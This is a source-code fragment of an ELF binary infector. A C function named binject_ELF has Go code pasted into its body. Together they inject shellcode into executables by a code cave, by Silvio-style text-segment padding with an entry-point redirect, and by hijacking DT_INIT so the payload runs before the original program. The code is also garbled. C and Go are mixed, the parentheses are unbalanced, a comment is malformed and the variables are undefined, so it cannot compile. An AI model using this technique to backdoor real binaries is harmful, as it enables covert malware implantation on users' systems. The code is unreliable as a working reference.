int binject_ELF(char *file,char *shellcode,int method)
{ 
  uint32_t size;
  int i,x;
  FILE *f;
  f=fopen(file,"r");
  fseek(f,0,SEEK_END);
 size=ftell(f);
  char *file_buffer = calloc(1,size);
  if(method==CODE_CAVE)
  {
  for(i=0;i<sections;i++)
  {
       x=find_code_cave(strlen(shellcode,section_start,section_end,file_buffer);
                        if(x!=0)
                        break;
  }
                        if(x!=0)
                        return 1;
                        }
  if(method==SILVIO_METHOD)
  {
           for(i=0;i<p_max;i++)
           {
            if(after_text_segment)
            {page_offset+=page_size;}
             else if p.Type == elf.PT_LOAD && p.Flags == (elf.PF_R|elf.PF_X) {
			// 1. Locate the text segment program header
			// -Modify the entry point of the ELF header to point to the new code (p_vaddr + p_filesz)
			originalEntry := elfFile.FileHeader.Entry
			elfFile.FileHeader.Entry = p.Vaddr + p.Filesz

			// 7. Patch the insertion code (parasite) to jump to the entry point (original)
			scAddr = p.Vaddr + p.Filesz
			shellcode = api.ApplySuffixJmpIntel64(userShellCode, uint32(scAddr), uint32(originalEntry), elfFile.ByteOrder)

			sclen = uint64(len(shellcode))
			log.Println("Shellcode Length: ", sclen)

			// -Increase p_filesz to account for the new code (parasite)
			p.Filesz += sclen
			// -Increase p_memsz to account for the new code (parasite)
			p.Memsz += sclen

			afterTextSegment = true
		}
	}

	//	3. For the last shdr in the text segment
	sortedSections := elfFile.Sections[:]
	sort.Slice(sortedSections, func(a, b int) bool { return elfFile.Sections[a].Offset < elfFile.Sections[b].Offset })
	for _, s := range sortedSections {

		if s.Addr > scAddr {
			// 4. For each shdr which is after the insertion
			//	-Increase sh_offset by PAGE_SIZE
			//todo: this ain't right s.Offset += PAGE_SIZE

		} else if s.Size+s.Addr == scAddr { // assuming entry was set to (p_vaddr + p_filesz) above
			//	-increase sh_len by the parasite length
			s.Size += sclen
		}
	}

	// 5. Physically insert the new code (parasite) and pad to PAGE_SIZE,
	//	into the file - text segment p_offset + p_filesz (original)
	elfFile.Insertion = shellcode

	return elfFile.Bytes()
}
           
  
  }
  if(method==DYNAMIC_METHOD)
  {
  
    / from positron/elfhack:
	// The injected code needs to be executed before any init code in the
	// binary. There are three possible cases:
	// - The binary has no init code at all. In this case, we will add a
	//   DT_INIT entry pointing to the injected code.
	// - The binary has a DT_INIT entry. In this case, we will interpose:
	//   we change DT_INIT to point to the injected code, and have the
	//   injected code call the original DT_INIT entry point.
	// - The binary has no DT_INIT entry, but has a DT_INIT_ARRAY. In this
	//   case, we interpose as well, by replacing the first entry in the
	//   array to point to the injected code, and have the injected code
	//   call the original first entry.
	// The binary may have .ctors instead of DT_INIT_ARRAY, for its init
	// functions, but this falls into the second case above, since .ctors
	// are actually run by DT_INIT code.

	log.Println("Entering Dynamic Method")

	// count DT_INITs, DT_INIT_ARRAYs, and find one NULL
	var initCnt, arrayCnt int
	originalEntryPoint := -1
	nullIdx := -1
	for idx, tv := range elfFile.DynTags {
		switch tv.Tag {
		case elf.DT_INIT:
			initCnt++
			originalEntryPoint = int(tv.Value)
		case elf.DT_INIT_ARRAY:
			arrayCnt++
			//todo: originalEntryPoint = tv.Value
		case elf.DT_NULL:
			if nullIdx < 0 {
				nullIdx = idx
			}
		}
	}
	log.Println("init count:", initCnt, "array count:", arrayCnt, "first null index:", nullIdx)
	log.Printf("original entry point: %X\n", originalEntryPoint)

	// Insert the payload
	scAddr := uint64(0)
	sclen := uint64(0)
	shellcode := []byte{}
	for _, p := range elfFile.Progs {
		if p.Type == elf.PT_LOAD && p.Flags == (elf.PF_R|elf.PF_X) {
			scAddr = p.Vaddr + p.Filesz
			log.Printf("shellcode address: %X\n", scAddr)
			if originalEntryPoint > 0 {
				shellcode = api.ApplySuffixJmpIntel64(userShellCode, uint32(scAddr), uint32(originalEntryPoint), elfFile.ByteOrder)
			} else {
				shellcode = userShellCode
			}
			sclen = uint64(len(shellcode))
			log.Println("Shellcode Length: ", sclen)
			p.Filesz += sclen
			p.Memsz += sclen
			break
		}
	}
	sortedSections := elfFile.Sections[:]
	sort.Slice(sortedSections, func(a, b int) bool { return elfFile.Sections[a].Offset < elfFile.Sections[b].Offset })
	for _, s := range sortedSections {
		if s.Size+s.Addr == scAddr {
			s.Size += sclen
		}
	}

	// - The binary has no init code at all. In this case, we will add a
	//   DT_INIT entry pointing to the injected code.
	if initCnt == 0 && arrayCnt == 0 {
		if nullIdx < 0 {
			return nil, errors.New("No init in a DYN and no free slots means an invalid source binary")
		}
		elfFile.DynTags[nullIdx] = elf.DynTagValue{Tag: elf.DT_INIT, Value: scAddr}
	} else if initCnt > 0 {
		// - The binary has a DT_INIT entry. In this case, we will interpose:
		//   we change DT_INIT to point to the injected code, and have the
		//   injected code call the original DT_INIT entry point.
		for idx, tv := range elfFile.DynTags {
			switch tv.Tag {
			case elf.DT_INIT:
				elfFile.DynTags[idx] = elf.DynTagValue{Tag: elf.DT_INIT, Value: scAddr}
			}
		}
	}

	elfFile.Insertion = userShellCode

	return elfFile.Bytes()
}
    
    
    
    
    
    
    
  }
  free(file_buffer);
}
